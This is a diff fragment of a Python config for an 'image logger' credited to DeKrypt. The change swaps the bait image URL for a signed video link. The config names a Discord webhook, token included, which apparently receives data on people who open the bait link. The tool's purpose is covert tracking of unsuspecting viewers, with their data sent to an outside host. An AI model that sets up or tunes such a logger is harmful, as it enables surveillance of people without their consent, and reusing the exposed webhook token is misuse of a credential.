@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1192956131023270020/RF9xVzqxFsZh_8gAoFj0Sfmw8YXWTGGIESNxOZXmEeI0zfF7JOJwNawiMEc-sLCSFd6j",
-    "image": "https://cdn.discordapp.com/attachments/1121771382192230432/1200903069920145608/Screenshot_2024-01-27-21-37-57-939_com.google.android.youtube-edit.jpg?ex=65c7df23&is=65b56a23&hm=d8819475cd1d6456a1b4412bdd3a8cdebaff9b878d21e7076815cbac16240ca9&", # You can also have a custom image by using a URL argument
+    "image": "https://d1e9l53z07zr6d.cloudfront.net/t7w2g3%2Ffile%2F6c950d931f7ba02c594aa643b7c62157_87d021467c142e4f9c54d9de6b152080.mp4?response-content-disposition=inline%3Bfilename%3D%226c950d931f7ba02c594aa643b7c62157_87d021467c142e4f9c54d9de6b152080.mp4%22%3B&response-content-type=video%2Fmp4&Expires=1706672361&Signature=brGFE~4kEPAvDICJnnHnRn639lII4I1v1eEy8zf77wexAQEGTVZeYjvTVfe9Vc-eK4lVcSj4T9W2sXcLleOhYSy4Ak~8Ws8r3s~eAu2NOfTWQeazQLWxR~2pEBQ4tEwLa8FmDK5izYs~ahE2IbpgBnOyjImQASzZuuK1d3~1BOZ13JQqYA0MxqdJthky3hTsIsbfm86q3Jrdj-aNGvL2m154~yGiqKMl9LZ40VF27fQy1HNDgnB4Mrm-W1uI6xmBe3Kfrz0TS8YDVnqiOWx2oFaPIVrlzBfABadqkAF9fB7oGVIgx1r5x6smJW5R5mEa2NDuQkyVJa1MJOI521AmRA__&Key-Pair-Id=APKAJT5WQLLEOADKLHBQ", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
